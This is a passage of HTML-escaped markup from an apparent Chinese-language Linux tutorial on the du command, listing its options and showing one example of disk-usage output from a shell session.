					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09762792758695-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09762792758695-1&quot;&gt;
&lt;span class=&quot;crayon-r&quot;&gt;du&lt;/span&gt; &lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;选项&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;文件&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0005 seconds] --&gt;
&lt;p&gt;2．命令功能：&lt;/p&gt;
&lt;p&gt;显示每个文件和目录的磁盘使用空间。&lt;/p&gt;
&lt;p&gt;3．命令参数：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587aceed0976d894663985&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
-a或-all  显示目录中个别文件的大小。   

-b或-bytes  显示目录或文件大小时，以byte为单位。   

-c或--total  除了显示个别目录或文件的大小外，同时也显示所有目录或文件的总和。 

-k或--kilobytes  以KB(1024bytes)为单位输出。

-m或--megabytes  以MB为单位输出。   

-s或--summarize  仅显示总计，只列出最后加总的值。

-h或--human-readable  以K，M，G为单位，提高信息的可读性。

-x或--one-file-xystem  以一开始处理时的文件系统为准，若遇上其它不同的文件系统目录则略过。 

-L&amp;lt;符号链接&amp;gt;或--dereference&amp;lt;符号链接&amp;gt; 显示选项中所指定符号链接的源文件大小。   

-S或--separate-dirs   显示个别目录的大小时，并不含其子目录的大小。 

-X&amp;lt;文件&amp;gt;或--exclude-from=&amp;lt;文件&amp;gt;  在&amp;lt;文件&amp;gt;指定目录或文件。   

--exclude=&amp;lt;目录或文件&amp;gt;         略过指定的目录或文件。    

-D或--dereference-args   显示指定符号链接的源文件大小。   

-H或--si  与-h参数相同，但是K，M，G是以1000为换算单位。   

-l或--count-links   重复计算硬件链接的文件。&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed0976d894663985-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed0976d894663985-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed0976d894663985-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed0976d894663985-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed0976d894663985-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed0976d894663985-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed0976d894663985-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed0976d894663985-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed0976d894663985-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed0976d894663985-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed0976d894663985-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed0976d894663985-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed0976d894663985-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed0976d894663985-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed0976d894663985-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed0976d894663985-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed0976d894663985-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed0976d894663985-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed0976d894663985-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed0976d894663985-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed0976d894663985-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed0976d894663985-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed0976d894663985-23&quot;&gt;23&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed0976d894663985-24&quot;&gt;24&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed0976d894663985-25&quot;&gt;25&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed0976d894663985-26&quot;&gt;26&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed0976d894663985-27&quot;&gt;27&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed0976d894663985-28&quot;&gt;28&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed0976d894663985-29&quot;&gt;29&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed0976d894663985-1&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;a&lt;/span&gt;或&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;all&lt;/span&gt;  显示目录中个别文件的大小。   &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed0976d894663985-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed0976d894663985-3&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;b&lt;/span&gt;或&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;bytes&lt;/span&gt;  显示目录或文件大小时，以&lt;span class=&quot;crayon-t&quot;&gt;byte&lt;/span&gt;为单位。   &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed0976d894663985-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed0976d894663985-5&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;c&lt;/span&gt;或&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;total&lt;/span&gt;  除了显示个别目录或文件的大小外，同时也显示所有目录或文件的总和。 &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed0976d894663985-6&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed0976d894663985-7&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;k&lt;/span&gt;或&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;kilobytes&lt;/span&gt;  以&lt;span class=&quot;crayon-e&quot;&gt;KB&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1024bytes&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;为单位输出。&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed0976d894663985-8&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed0976d894663985-9&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;m&lt;/span&gt;或&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;megabytes&lt;/span&gt;  以&lt;span class=&quot;crayon-i&quot;&gt;MB&lt;/span&gt;为单位输出。   &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed0976d894663985-10&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed0976d894663985-11&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;s&lt;/span&gt;或&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;summarize&lt;/span&gt;  仅显示总计，只列出最后加总的值。&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed0976d894663985-12&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed0976d894663985-13&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;h&lt;/span&gt;或&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;human&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;readable&lt;/span&gt;  以&lt;span class=&quot;crayon-i&quot;&gt;K&lt;/span&gt;，&lt;span class=&quot;crayon-i&quot;&gt;M&lt;/span&gt;，&lt;span class=&quot;crayon-i&quot;&gt;G&lt;/span&gt;为单位，提高信息的可读性。&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed0976d894663985-14&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed0976d894663985-15&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;x&lt;/span&gt;或&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;one&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;xystem&lt;/span&gt;  以一开始处理时的文件系统为准，若遇上其它不同的文件系统目录则略过。 &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed0976d894663985-16&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed0976d894663985-17&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;lt;&lt;/span&gt;符号链接&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;或&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dereference&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;lt;&lt;/span&gt;符号链接&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt; 显示选项中所指定符号链接的源文件大小。   &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed0976d894663985-18&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed0976d894663985-19&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;S&lt;/span&gt;或&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;separate&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;dirs&lt;/span&gt;   显示个别目录的大小时，并不含其子目录的大小。 &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed0976d894663985-20&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed0976d894663985-21&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;X&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;lt;&lt;/span&gt;文件&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;或&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;exclude&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;lt;&lt;/span&gt;文件&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;  在&lt;span class=&quot;crayon-o&quot;&gt;&amp;lt;&lt;/span&gt;文件&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;指定目录或文件。   &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed0976d894663985-22&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed0976d894663985-23&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;exclude&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;lt;&lt;/span&gt;目录或文件&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;         略过指定的目录或文件。    &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed0976d894663985-24&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed0976d894663985-25&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;D&lt;/span&gt;或&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dereference&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;args&lt;/span&gt;   显示指定符号链接的源文件大小。   &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed0976d894663985-26&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed0976d894663985-27&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;H&lt;/span&gt;或&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;si&lt;/span&gt;  与&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;h&lt;/span&gt;参数相同，但是&lt;span class=&quot;crayon-i&quot;&gt;K&lt;/span&gt;，&lt;span class=&quot;crayon-i&quot;&gt;M&lt;/span&gt;，&lt;span class=&quot;crayon-i&quot;&gt;G&lt;/span&gt;是以&lt;span class=&quot;crayon-cn&quot;&gt;1000&lt;/span&gt;为换算单位。   &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed0976d894663985-28&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed0976d894663985-29&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;l&lt;/span&gt;或&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;links&lt;/span&gt;   重复计算硬件链接的文件。&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0050 seconds] --&gt;
&lt;p&gt;4．使用实例：&lt;/p&gt;
&lt;p&gt;实例1：显示目录或者文件所占空间&lt;/p&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587aceed09772064963022&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
du&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09772064963022-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09772064963022-1&quot;&gt;&lt;span class=&quot;crayon-r&quot;&gt;du&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0004 seconds] --&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587aceed09775861615007&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
[root@localhost test]# du

608     ./test6

308     ./test4

4       ./scf/lib

4       ./scf/service/deploy/product

4       ./scf/service/deploy/info

12      ./scf/service/deploy

16      ./scf/service

4       ./scf/doc

4       ./scf/bin

32      ./scf

8       ./test3

1288    .

[root@localhost test]#&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09775861615007-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09775861615007-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09775861615007-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09775861615007-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09775861615007-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09775861615007-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09775861615007-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09775861615007-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09775861615007-9&quot;&gt;9&lt;/div&gt;
